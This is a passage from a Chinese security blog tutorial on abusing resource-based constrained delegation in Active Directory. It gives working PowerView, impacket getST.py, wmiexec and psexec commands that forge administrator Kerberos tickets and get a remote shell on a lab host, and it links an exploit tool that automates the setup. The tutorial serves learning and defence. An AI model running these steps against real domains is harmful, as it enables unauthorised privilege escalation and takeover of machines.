</code></pre><p><img data-src="C:/Users/momo/AppData/Roaming/Typora/typora-user-images/image-20220624134314201.png" alt="image-20220624134314201"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134322692.png" alt="image-20220624134322692"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134327526.png" alt="image-20220624134327526"></p><h4 id="setp2-设置资源委派"><a class="anchor" href="#setp2-设置资源委派">#</a> Setp2 设置资源委派</h4><p>前面我们创建了机器账号，也就是说成功注册了 SPN，接着就可以设置 momomachine 到 test11 这台机子的委派了。</p><p>这里还是使用 powerview 去操作。</p><pre><code>Get-Netcomputer momomachine | select objectsid #获取机器账号的sid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2955859873-908271592-1975121256-1710)&quot;

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer [目标主机名]| Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125; -Verbose

</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134419229.png" alt="image-20220624134419229"></p><pre><code>Get-DomainComputer test11 -Properties msds-allowedtoactonbehalfofotheridentity #查看资源委派添加成功与否。
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134456946.png" alt="image-20220624134456946"></p><h4 id="setp3-利用资源委派进行提权"><a class="anchor" href="#setp3-利用资源委派进行提权">#</a> Setp3 利用资源委派进行提权</h4><p>和约束委派差不多。因为当前机子 test11 信任了 momomachine 这个 SPN 的委派，所以我们就需要先获取这个 SPN 的</p><p>ST 票据，可是这里我们没导出内存的权限，但别忘记了我们已经有密码了，没必要导出内存，直接用密码向 KDC 申请 ST1，</p><p>并用这个 ST1 通过 S4U 协议来伪造一个 administartor 请求机器 test11 的 ST2，从而实现提权就完事了。</p><p>PS: 这里我还是不用 rebeus 来搞，毕竟这玩意需要目标机子有.NET 环境。</p><p>这里我们使用 impacket</p><pre><code>python3 getST.py -dc-ip 192.168.152.128 ruyue.com/momomachine\$:777777 -spn cifs/test11.ruyue.com -impersonate administrator

</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134733782.png" alt="image-20220624134733782"></p><pre><code>
export KRB5CCNAME=/usr/mytool/impacket/examples/administrator.ccache   

python3 wmiexec.py test11.ruyue.com -no-pass -k -dc-ip 192.168.152.128
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134750902.png" alt="image-20220624134750902"></p><p>PS：wmiexec 执行一些命令会乱码，所以可以用</p><pre><code>python3 psexec.py -k -no-pass test11.ruyue.com
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134811768.png" alt="image-20220624134811768"></p><h4 id="setp4-直接exp完成setp1和setp2"><a class="anchor" href="#setp4-直接exp完成setp1和setp2">#</a> Setp4 直接 EXP 完成 Setp1 和 Setp2</h4><p>前面的 setp1 和 step2 都可以利用工具完成，如下：</p><p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BrYjFzL1NoYXJwQWxsb3dlZFRvQWN0LzFlY2UyNTViMDk3OWI4YjQ0N2NhMjdjZTg4NGZjZjgzYmRmOWM2NzMvU2hhcnBBbGxvd2VkVG9BY3QvUHJvZ3JhbS5jcw==">https://raw.githubusercontent.com/pkb1s/SharpAllowedToAct/1ece255b0979b8b447ca27ce884fcf83bdf9c673/SharpAllowedToAct/Program.cs</span></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134949109.png" alt="image-20220624134949109"></p><p>如图直接执行 exp，就完成步骤 1 和 2，接着只需要操作步骤 3 就完事了。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/image-20220624134956487.png" alt="image-20220624134956487"></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-06-24 14:04:45" itemprop="dateModified" datetime="2022-06-24T14:04:45+08:00">2022-06-24</time> </span><span id="2022/06/24/域委派/" class="item leancloud_visitors" data-flag-title="域委派的原理与利用" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>ruyue <i class="ic i-at"><em>@</em></i>如月专注</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/" title="域委派的原理与利用">http://example.com/2022/06/24/域委派/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2022/05/31/SPN%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;fastly.jsdelivr.net&#x2F;gh&#x2F;ruyueattention&#x2F;ruyueattention.github.io&#x2F;images&#x2F;4.jpg" title="SPN服务主体名称"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Windows安全</span><h3>SPN服务主体名称</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.</span> <span class="toc-text">域委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%81%E8%83%BD%E8%A2%AB%E8%AE%BE%E7%BD%AE%E5%A7%94%E6%B4%BE%E5%B1%9E%E6%80%A7"><span class="toc-number">1.2.</span> <span class="toc-text">谁能被设置委派属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%A7%94%E6%B4%BE"><span class="toc-number">1.3.</span> <span class="toc-text">设置委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7%E8%AE%BE%E7%BD%AE%E5%A7%94%E6%B4%BE"><span class="toc-number">1.3.1.</span> <span class="toc-text">机器用户设置委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8Cspn%E8%AE%BE%E7%BD%AE%E5%A7%94%E6%B4%BE%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E8%AE%BE%E7%BD%AE%E5%A7%94%E6%B4%BE"><span class="toc-number">1.3.2.</span> <span class="toc-text">域用户注册 SPN 设置委派（服务账号设置委派）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">2.</span> <span class="toc-text">非约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.</span> <span class="toc-text">特点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">基础利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spooler%E6%89%93%E5%8D%B0%E6%9C%BAbug%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">2.4.</span> <span class="toc-text">spooler 打印机 BUG + 非约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%83%B3%E6%B3%95"><span class="toc-number">2.4.3.</span> <span class="toc-text">其他想法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">3.</span> <span class="toc-text">约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#s4u2proxy-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">3.1.1.</span> <span class="toc-text">S4U2Proxy (约束委派)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s4u2self%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2"><span class="toc-number">3.1.2.</span> <span class="toc-text">S4U2Self (协议转换)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">其中存在的问题与利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E5%9E%8B%E5%A7%94%E6%B4%BE"><span class="toc-number">4.</span> <span class="toc-text">资源型委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">4.2.1.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%93%AA%E5%8F%B0%E6%9C%BA%E5%AD%90%E8%A2%AB%E8%B0%81%E5%B8%A6%E5%85%A5%E5%9F%9F%E7%9A%84"><span class="toc-number">4.2.2.</span> <span class="toc-text">查询哪台机子被谁带入域的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text">提权利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#setp1-%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E8%B4%A6%E5%8F%B7"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">Setp1 创建机器账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setp2-%E8%AE%BE%E7%BD%AE%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">Setp2 设置资源委派</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setp3-%E5%88%A9%E7%94%A8%E8%B5%84%E6%BA%90%E5%A7%94%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.3.3.</span> <span class="toc-text">Setp3 利用资源委派进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#setp4-%E7%9B%B4%E6%8E%A5exp%E5%AE%8C%E6%88%90setp1%E5%92%8Csetp2"><span class="toc-number">4.2.3.4.</span> <span class="toc-text">Setp4 直接 EXP 完成 Setp1 和 Setp2</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2021/07/26/Windows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/" rel="bookmark" title="Windows抓取密码">Windows抓取密码</a></li><li><a href="/2021/07/26/Windows%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" rel="bookmark" title="Windows远程执行命令">Windows远程执行命令</a></li><li><a href="/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" rel="bookmark" title="利用DCOM进行横向渗透">利用DCOM进行横向渗透</a></li><li><a href="/2021/12/26/COM%E5%8A%AB%E6%8C%81/" rel="bookmark" title="COM在权限维持中的应用">COM在权限维持中的应用</a></li><li><a href="/2022/04/27/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8E%E6%9C%AC%E5%9C%B0%E7%BB%84%E7%AD%96%E7%95%A5/" rel="bookmark" title="本地组策略与域组策略">本地组策略与域组策略</a></li><li><a href="/2022/05/31/SPN%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0/" rel="bookmark" title="SPN服务主体名称">SPN服务主体名称</a></li><li class="active"><a href="/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/" rel="bookmark" title="域委派的原理与利用">域委派的原理与利用</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ruyue" data-src="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/avatar.jpg"><p class="name" itemprop="name">ruyue</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">28</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">10</span> <span class="name">分类</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1eXVlYXR0ZW50aW9u" title="https:&#x2F;&#x2F;github.com&#x2F;ruyueattention"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Vlunstack/" title="分类于 Vlunstack">Vlunstack</a></div><span><a href="/2020/10/26/Vlunstack1/" title="Vlunsatck1">Vlunsatck1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" title="分类于 服务器配置">服务器配置</a></div><span><a href="/2022/04/13/%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/" title="透明代理-clash+ubuntu">透明代理-clash+ubuntu</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/2021/07/21/CVE-2021-1675/" title="CVE-2021-1675(Windows Print Spooler权限提升漏洞)">CVE-2021-1675(Windows Print Spooler权限提升漏洞)</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vlunstack/" title="分类于 Vlunstack">Vlunstack</a></div><span><a href="/2021/01/04/Vlunstack2/" title="Vlunsatck2">Vlunsatck2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/02/15/k8s-kunbernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="k8s-Kubernetes环境搭建">k8s-Kubernetes环境搭建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/2021/10/09/Exchange%20Proxyshell/" title="Exchange Proxyshell">Exchange Proxyshell</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/" title="域委派的原理与利用">域委派的原理与利用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/03/17/docker%E7%BD%91%E7%BB%9C/" title="docker网络">docker网络</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2021/07/26/Windows%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" title="Windows远程执行命令">Windows远程执行命令</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/05/12/docker%E8%AF%86%E5%88%AB/" title="Docker环境探测识别">Docker环境探测识别</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ruyue @ 如月专注</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">105k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">1:35</span></div><div class="powered-by"></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2022/06/24/域委派/",favicon:{show:"夺去目光的故事",hide:"蒙上双眼的故事"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->